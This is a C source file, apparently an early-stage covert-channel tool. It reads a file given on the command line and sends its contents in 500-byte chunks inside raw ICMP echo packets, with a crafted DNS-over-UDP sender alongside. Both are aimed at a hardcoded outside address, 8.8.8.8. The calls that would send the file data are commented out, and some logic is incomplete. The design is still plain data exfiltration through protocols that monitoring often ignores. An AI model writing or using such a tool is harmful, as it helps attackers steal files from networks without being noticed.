#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include "headers/dns.h"


uint16_t icmp_chk(void *buffer, int len);
int covert_icmp(struct in_addr *dst, char *data, int code);
int covert_dns(struct in_addr *dst, char *data, int code);

int main(int argc, char *argv[]) {
    FILE *fp = fopen(argv[1], "rb");
    fseek(fp, 0, SEEK_END);

    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *data = malloc(fsize + 1);
    fread(data, fsize, 1, fp);
    fclose(fp);

    data[fsize] = 0;
    
    struct hostent *host = gethostbyname("8.8.8.8");
    struct in_addr *dst;

    dst = (struct in_addr *)host->h_addr_list[0];
    
    //covert_icmp(dst, "filetest.c", 1101);
    //covert_icmp(dst, data, 1102);
    //covert_icmp(dst, "abcdefghij", 1103);
    covert_dns(dst, "blah", 1101);
    return 0;
}


int covert_dns(struct in_addr *dst, char *data, int code) {
    struct dnshdr_k dns_hdr;
    struct sockaddr_in addr;

    unsigned char packet[2048];
    
    int ch;
    int chunk = 1;
    int chunk_size = 500;
    int on = 1;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock <0) {
        perror("socket");
        return 1;
    }

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr = *dst;
    addr.sin_port = htons(53);

    memset(&dns_hdr, 0, sizeof(dns_hdr));
    dns_hdr.t_id = htons(0x2050);
    //dns_hdr.flags = htons(0x2565);
    dns_hdr.cd = 1;
    dns_hdr.ad = 0;
    dns_hdr.z = 0;
    dns_hdr.ra = 0;
    dns_hdr.rd = 0;
    dns_hdr.tc = 0;
    dns_hdr.aa = 0;
    dns_hdr.opcode = 2;
    dns_hdr.qr = 0;
    dns_hdr.rcode = 0;
    //printf("dns header size: %x\n", dns_hdr);

    memcpy(packet, &dns_hdr, sizeof(dns_hdr));
    memcpy(packet + sizeof(dns_hdr), "testing", 7);

    printf("packet: %x\n", packet);

    if((ch = sendto(sock, packet, sizeof(dns_hdr)+7, 0,
                (struct sockaddr*)&addr, sizeof(addr))) <=0) {
        
        perror("sendto");
        return -1;
    }

    close(sock);

    return 0;
}



int covert_icmp(struct in_addr *dst, char *data, int code) {
    struct icmphdr icmp_hdr;
    struct sockaddr_in addr;

    unsigned char packet[2048];

    int ttl = 60;
    int on = 1;
    int chunk_size = 500;
    int chunk = 1;
    int ch, data_length=0;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(sock < 0) {
        perror("socket");
        return -1;
    }

    chunk = ((strlen(data)+(chunk_size-1))/chunk_size);

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr = *dst;
    addr.sin_port = 0;

    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.type = ICMP_ECHO;
    icmp_hdr.checksum = 0;
    icmp_hdr.un.echo.id = code;

    if((setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl))) < 0) {
        perror("setsockopt");
        return -1;
    }

    for(int i=0;i<chunk;i++) {

        if(i == (chunk-1)) {
            if(((chunk*chunk_size) - strlen(data)) > 0) {
                data_length = strlen(data) - ((chunk-1) * chunk_size);
                //data_length = (chunk * chunk_size) - data_length;
            } else {
                data_length = chunk_size;
            }
        } else {
            data_length = chunk_size;
        }

        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));
        memcpy(packet + sizeof(icmp_hdr), data+(i*chunk_size), data_length);

        icmp_hdr.checksum = icmp_chk(packet, sizeof(icmp_hdr)+data_length);
        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));

        if((ch = sendto(sock, packet, sizeof(icmp_hdr) + data_length, 0, 
                    (struct sockaddr*)&addr, sizeof(addr))) <= 0) {

            perror("sendto");
            return -1;
        }

        icmp_hdr.checksum = 0;

    }
    close(sock);

    return 0;
}

uint16_t icmp_chk(void *buffer, int len) {
    unsigned short *buf = buffer;
    unsigned int sum = 0;
    unsigned short result;

    for(sum = 0; len > 1; len -= 2)
        sum += *buf++;
    
    if(len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    result = ~sum;
    return result;
}
